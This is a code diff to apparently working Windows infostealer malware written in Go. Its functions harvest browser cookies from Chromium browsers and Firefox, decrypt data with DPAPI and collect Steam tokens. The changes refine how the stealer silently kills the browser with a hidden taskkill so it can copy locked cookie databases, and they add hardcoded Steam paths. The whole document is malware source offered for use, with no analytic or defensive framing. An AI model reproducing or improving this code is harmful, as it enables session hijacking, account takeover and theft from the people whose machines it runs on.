@@ -43,9 +43,9 @@ func runStealer() string {
 			var cookies string
 			var errs []string
 			if br.name == "Firefox" {
-				cookies, errs = stealFirefoxCookies(basePath)
+				cookies, errs = stealFirefoxCookies(basePath, br.exe)
 			} else {
-				cookies, errs = stealChromiumCookies(basePath, br.name)
+				cookies, errs = stealChromiumCookies(basePath, br.name, br.exe)
 			}
 			diagErrors = append(diagErrors, errs...)
 
@@ -94,7 +94,7 @@ func runStealer() string {
 	return string(out)
 }
 
-func stealChromiumCookies(userDataPath string, browserName string) (string, []string) {
+func stealChromiumCookies(userDataPath string, browserName string, browserExe string) (string, []string) {
 	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"}
 	var allCookies strings.Builder
 	var errs []string
@@ -109,12 +109,12 @@ func stealChromiumCookies(userDataPath string, browserName string) (string, []st
 		}
 
 		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_cookies_%s_%s_%d", browserName, profile, time.Now().UnixNano()))
-		if err := copyFileLocked(cookiePath, tmpPath); err != nil {
+		if err := copyFileLocked(cookiePath, tmpPath, browserExe); err != nil {
 			errs = append(errs, fmt.Sprintf("%s/%s copy: %v", browserName, profile, err))
 			continue
 		}
-		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal")
-		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm")
+		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", browserExe)
+		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm", browserExe)
 		defer os.Remove(tmpPath)
 		defer os.Remove(tmpPath + "-wal")
 		defer os.Remove(tmpPath + "-shm")
@@ -161,7 +161,7 @@ func stealChromiumCookies(userDataPath string, browserName string) (string, []st
 	return allCookies.String(), errs
 }
 
-func stealFirefoxCookies(profilesPath string) (string, []string) {
+func stealFirefoxCookies(profilesPath string, browserExe string) (string, []string) {
 	var allCookies strings.Builder
 	var errs []string
 
@@ -180,12 +180,12 @@ func stealFirefoxCookies(profilesPath string) (string, []string) {
 		}
 
 		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_ff_cookies_%s_%d", e.Name(), time.Now().UnixNano()))
-		if err := copyFileLocked(cookiePath, tmpPath); err != nil {
+		if err := copyFileLocked(cookiePath, tmpPath, "firefox.exe"); err != nil {
 			errs = append(errs, fmt.Sprintf("firefox/%s copy: %v", e.Name(), err))
 			continue
 		}
-		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal")
-		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm")
+		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", "firefox.exe")
+		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm", "firefox.exe")
 		defer os.Remove(tmpPath)
 		defer os.Remove(tmpPath + "-wal")
 		defer os.Remove(tmpPath + "-shm")
@@ -353,6 +353,9 @@ func stealSteamTokens() string {
 		filepath.Join(os.Getenv("ProgramFiles(x86)"), "Steam"),
 		filepath.Join(os.Getenv("ProgramFiles"), "Steam"),
 		filepath.Join(os.Getenv("LOCALAPPDATA"), "Steam"),
+		"C:\\Program Files (x86)\\Steam",
+		"D:\\Steam",
+		"C:\\Steam",
 	}
 
 	var sb strings.Builder
@@ -518,16 +521,22 @@ func dpapiDecrypt(data []byte) ([]byte, error) {
 	return result, nil
 }
 
-func copyFileLocked(src, dst string) error {
+func copyFileLocked(src, dst, browserExe string) error {
 	data, err := os.ReadFile(src)
 	if err == nil && len(data) > 0 {
 		return os.WriteFile(dst, data, 0o644)
 	}
 
-	for _, proc := range []string{"chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "firefox.exe"} {
-		cmd := exec.Command("taskkill", "/F", "/IM", proc)
+	if browserExe != "" {
+		cmd := exec.Command("taskkill", "/F", "/IM", browserExe)
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		_ = cmd.Run()
+	} else {
+		for _, proc := range []string{"chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "firefox.exe"} {
+			cmd := exec.Command("taskkill", "/F", "/IM", proc)
+			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			_ = cmd.Run()
+		}
 	}
 	time.Sleep(500 * time.Millisecond)
 
